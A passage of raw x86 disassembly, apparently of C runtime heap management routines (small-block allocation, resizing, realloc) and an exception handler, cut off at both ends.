  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
